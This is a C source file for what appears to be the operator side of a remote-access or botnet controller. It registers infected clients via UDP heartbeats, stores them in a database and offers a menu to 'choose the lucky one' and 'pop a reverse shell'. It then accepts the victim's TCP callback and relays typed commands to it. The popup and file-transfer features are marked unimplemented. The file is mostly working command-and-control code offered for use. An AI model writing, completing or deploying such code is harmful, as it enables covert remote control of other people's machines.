#include "netlib.h"
#include "db.h"
#include <pthread.h>
#include "bs_config.h"
#include "utils.h"
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>

enum SIG  {_SIG_INIT = 0x00, _SIG_HRBT= 0xff, _SIG_FILE = 0x01, _SIG_COUT = 0x02, _SIG_SHLL = 0x03};

volatile int terminate_thread = 0;

struct udp_arg{
    int sockfd;
    struct db* db;
};

// void udp_handler(isockfd){

// }

void* udp_handler(void* args){
    struct udp_arg* ua = (struct udp_arg*) args;
    struct db* db = ua->db;
    int sockfd_u = ua->sockfd;
    char siginit = 0;
    int bytes = 0;
    struct sockaddr_in client_addr;
    socklen_t client_addr_len = 16;
    unsigned char buffer[8];
    memset(&client_addr, 0, sizeof(client_addr));
    while (!terminate_thread){
        if ((bytes = recvfrom(sockfd_u, buffer, 8, 0, (struct sockaddr*)&client_addr, &client_addr_len)) > 0){
            printf("we got %d bytes first byte we got is %d\n",bytes,  buffer[0]);
            printf("inet addr we got connection from is %s\n", get_ip(client_addr));
            if (buffer[0] == _SIG_INIT){
                send_udp(sockfd_u, &client_addr, &siginit, 1);
                add_db(db, (char*)&client_addr, time(NULL));
            }
            if (buffer[0] == _SIG_HRBT){
                DBGLG("Got a heartbeat\n");
                if (upd_timestamp_db(db, get_ip(client_addr))< 0){
                    DBGLG("Failed to update a heartbeat\n");
                }
            }
                
            }
    }
}

void solo_interaction(struct db* db, int sockfd_u)
{
    int user;
    int choice;
    int sockfd_tc;
    struct sockaddr_in sa;
    struct sockaddr_in tsa;
    int junk = 16;
    char shll = _SIG_SHLL;
    char buf[2048];
    int response;
    int client_fd;
    int select_result;
    memset(&buf, 0,2048);
    printf("Choose a user\n");
    print_db(db);
    isc(&user);
    printf("Choose the deed:\n0 - Cout: popup window on client machine UNIMPLEMENTED\n1 - \
Shell: pop a reverse shell\n2 - File: send or recieve a file UNIMPLEMENTED\n3 - exit this menu\n");
    isc(&choice);
    switch(choice){
        // case 0:
        //     DBGLG("Unimplemented\n");
        //     return;
        case 1:
            sa = *((struct sockaddr_in*)db->st[user]->sa);
                char ip[INET_ADDRSTRLEN]; // Buffer to hold the IP address string

            // Convert the binary IP address to a human-readable string
            inet_ntop(AF_INET, &(sa.sin_addr), ip, INET_ADDRSTRLEN);

            // Print the IP address and port number
            printf("IP Address: %s\n", ip);


            printf("Port: %d\n", ntohs(sa.sin_port));
            update_sockaddr_in(&tsa, AF_INET, TCP_PORT, NULL);
            create_tcp_socket(&sockfd_tc);
            bind_socket(sockfd_tc, &tsa);
            struct timeval timeout;
            timeout.tv_sec = 4;
            timeout.tv_usec = 0;
            if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
                perror("setsockopt");
                DBGLG("Could not set appropriate timeout\n");
                exit(EXIT_FAILURE); 
            }
            if (setsockopt(sockfd_u, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
                perror("setsockopt");
                DBGLG("Could not set appropriate timeout\n");
                exit(EXIT_FAILURE); 
            }
            listen_on_socket(sockfd_tc, 1);
            send_udp(sockfd_u, &sa, &shll, 1);
            if (((client_fd = accept(sockfd_tc, (struct sockaddr*) &sa, &junk)) < 0)){
                perror("failed to accept tcp: ");
                return;
            }
            sleep(1);
            
            while ((response = recv(client_fd, buf, sizeof(buf), 0)) > 0) {
                fd_set read_fds;
                FD_ZERO(&read_fds);
                FD_SET(client_fd, &read_fds);
                struct timeval timeout1;
                timeout.tv_sec = 0; // Timeout in seconds
                timeout.tv_usec = 1000;
                buf[response] = '\0';
                printf("%s", buf);
                fgets(buf, sizeof(buf), stdin);
                if (send(client_fd, buf, strlen(buf), 0) <= 0){
                    break;
                }
            }
            close(client_fd);
            close(sockfd_tc);
            break;
        default:
            DBGLG("Unimplemented, exiting\n");
            return;
        
    }
    return;
}

int main(int argc, char **argv)
{
	printf("Starting\n");
    pthread_t tid;
    struct db* db = NULL;
    int sockfd_u;
    struct sockaddr_in local_addr;
    DBGLG("Attempting to load a db\n");
    if (load_db(&db, "db.db") < 0){
        create_db(&db);
        if (db == NULL){
            exit(EXIT_FAILURE);
        }
    }
    create_udp_socket(&sockfd_u);
    
    update_sockaddr_in(&local_addr, AF_INET, UDP_PORT, NULL);
    bind_socket(sockfd_u, &local_addr);
    struct timeval timeout;
    timeout.tv_sec = 4;
    timeout.tv_usec = 0;
    if (setsockopt(sockfd_u, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout)) == -1) {
        perror("setsockopt");
        DBGLG("Could not set appropriate timeout\n");
        exit(EXIT_FAILURE); 
    }
    struct udp_arg ua = {sockfd_u, db};
    if(pthread_create(&tid, NULL, &udp_handler, &ua) != 0)
    {
        perror("Thread creation failed.");
        exit(EXIT_FAILURE);
    }
    pthread_detach(tid);
    
    DBGLG("Listening for UDP packets...\n");
    int choice = 0;
    while (1) {
        printf("choose your option:\n0 - view data base\n1 - choose the lucky one\n2 - exit\n\n");
        isc(&choice);
        switch (choice){
            case 0:
                print_db(db);
                break;
            case 1:
                solo_interaction(db, sockfd_u);
                break;
            case 2:
                terminate_thread = 1;
                pthread_join(tid, NULL);
                save_db(db, "./db.db");
                close(sockfd_u);
                goto _exit;
            default:
                printf("Unfamiliar with this option\n");
                break;

        }
        // TODO: Write a menu
        // basically a control panel
        // It can choose to which client to interact
        // Or Interact with all




    }
    _exit:
	printf("Exiting?\n");
    return EXIT_SUCCESS;
}
